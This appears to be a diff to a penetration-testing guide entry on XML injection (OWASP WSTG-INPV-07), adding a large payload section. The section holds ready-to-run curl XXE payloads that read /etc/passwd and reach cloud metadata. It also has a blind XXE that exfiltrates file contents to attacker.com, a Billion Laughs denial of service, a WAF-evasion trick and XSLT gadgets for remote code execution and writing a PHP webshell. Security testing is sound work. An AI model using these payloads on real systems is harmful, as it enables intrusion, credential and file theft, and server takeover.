@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: [xml, xpath]
 cwe_ids: [CWE-91]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "Raw XML tag injection into a document that is later parsed and rendered as HTML (e.g. CMS/SOAP content pipelines) lets an attacker smuggle an unsanitized script node into a field displayed to other users, achieving persistent Stored XSS = Critical (Mass Client Compromise)"
 ---
 
 # wstg-inpv-07
@@ -394,6 +395,191 @@ tester.run_tests()
 
 ---
 
+## Example Commands/Payloads
+
+### Basic In-Band XXE (curl)
+
+```bash
+TARGET="https://target.com/api/xml"
+
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml" --data-binary @- <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+EOF
+
+# SSRF via XXE (hit internal metadata/service endpoints)
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml" --data-binary @- <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<foo>&xxe;</foo>
+EOF
+```
+
+### Out-of-Band (Blind) XXE
+
+```bash
+# Host evil.dtd on an attacker-controlled server
+cat > evil.dtd <<'EOF'
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfil;
+EOF
+python3 -m http.server 8000 &
+
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml" --data-binary @- <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com:8000/evil.dtd">
+<foo>test</foo>
+EOF
+# Check attacker.com HTTP server access log for the exfiltrated file content
+```
+
+### Billion Laughs (XML DoS)
+
+```bash
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml" --data-binary @- <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<foo>&lol4;</foo>
+EOF
+```
+
+### Automated Tools
+
+```bash
+# XXEinjector - automated blind/OOB XXE with file read
+ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd
+
+# Test file uploads that accept XML-based formats (DOCX/XLSX/SVG) for XXE
+python3 oxml_xxe.py -i document.docx -o payload.docx -x xxe.xml -w office
+```
+
+### XInclude (when DOCTYPE/DTD is stripped but a value is reflected into a larger XML doc)
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+### Error-Based XXE via Local DTD Repurposing (no outbound network needed)
+
+Abuses an entity already defined in a DTD shipped on the target OS (e.g. `/usr/share/xml/fontconfig/fonts.dtd` on Linux, `cim20.dtd` on Windows) to leak file content inside a parser error message:
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+    <!ENTITY % constant 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+    %local_dtd;
+]>
+<message>Text</message>
+```
+
+### XXE on JSON Endpoints (Content-Type switch)
+
+If the API only accepts `application/json`, try re-sending the same logical request as `application/xml` — many frameworks still parse XML on the same endpoint:
+
+```bash
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml" \
+  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><search>&xxe;</search></root>'
+```
+
+### WAF Bypass via Encoding
+
+```bash
+# Some WAFs only inspect UTF-8; re-encode the payload to slip past signature matching
+cat payload.xml | iconv -f UTF-8 -t UTF-16BE > payload_utf16.xml
+curl -s -X POST "$TARGET" -H "Content-Type: application/xml; charset=utf-16" --data-binary @payload_utf16.xml
+```
+
+### XSLT Injection (from PayloadsAllTheThings)
+
+Distinct from XXE above: if the target processes user-influenced XSL stylesheets (not just XML documents), the XSLT processor's own extension functions can be abused for file read, SSRF, arbitrary file write, and — depending on vendor (PHP/libxslt, Java Xalan/Saxon, .NET) — full remote code execution, independent of any DOCTYPE/entity handling.
+
+```xml
+<!-- Step 1: fingerprint vendor/version to pick the right RCE gadget below -->
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
+    Version: <xsl:value-of select="system-property('xsl:version')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+<!-- File read / SSRF via document() -->
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('file:///etc/passwd')"/>
+    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+<!-- Arbitrary file write via EXSLT common:document extension -->
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0">
+  <xsl:template match="/">
+    <exploit:document href="webshell.php" method="text">&lt;?php system($_GET['cmd']); ?&gt;</exploit:document>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+```xml
+<!-- RCE - PHP backend (libxslt with the php:function extension registered) -->
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body><xsl:value-of select="php:function('system','id')" /></body>
+</html>
+
+<!-- RCE - Java backend (Xalan java.lang.Runtime binding) -->
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+  <xsl:template match="/">
+    <xsl:variable name="p" select="rt:exec(rt:getRuntime(),'id')"/>
+    <xsl:value-of select="ob:toString($p)"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+<!-- RCE - .NET backend (msxsl:script inline C#) -->
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
+  <msxsl:script language="C#" implements-prefix="user"><![CDATA[
+    public string exec(){ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); return "ok"; }
+  ]]></msxsl:script>
+  <xsl:template match="/"><xsl:value-of select="user:exec()"/></xsl:template>
+</xsl:stylesheet>
+```
+
+Send with: `curl -s -X POST "https://{target}/api/xslt" -H "Content-Type: application/xml" --data-binary @payload.xsl`
+
+Detection pattern: `system-property('xsl:vendor')` reflecting a real processor name (Xalan, Saxon, libxslt, MSXML) confirms XSLT (not just XML) is being parsed server-side — proceed to the vendor-matched RCE gadget.
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| Response body contains `/etc/passwd` contents or other local file data | In-band XXE file read confirmed |
+| Attacker-controlled HTTP server receives a callback with `?x=<base64/urlencoded file content>` | Blind/OOB XXE confirmed via out-of-band exfiltration |
+| Request to `169.254.169.254` or internal-only host succeeds where public URLs also work | XXE-driven SSRF confirmed, cloud metadata may be reachable |
+| Server hangs/times out or returns `500`/OOM error on nested entity payload | XML entity expansion DoS (Billion Laughs) confirmed |
+| Uploaded DOCX/XLSX/SVG triggers file read or SSRF when reopened by the server | XXE via office-document/image XML formats |
+
+---
+
 ## Remediation
 
 ```java
@@ -444,6 +630,14 @@ $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
 | **CWE-611** | Improper Restriction of XML External Entity Reference |
 | **CWE-91**  | XML Injection                                         |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for XML Injection (WSTG-INPV-07)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
+- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
 
 ---
 
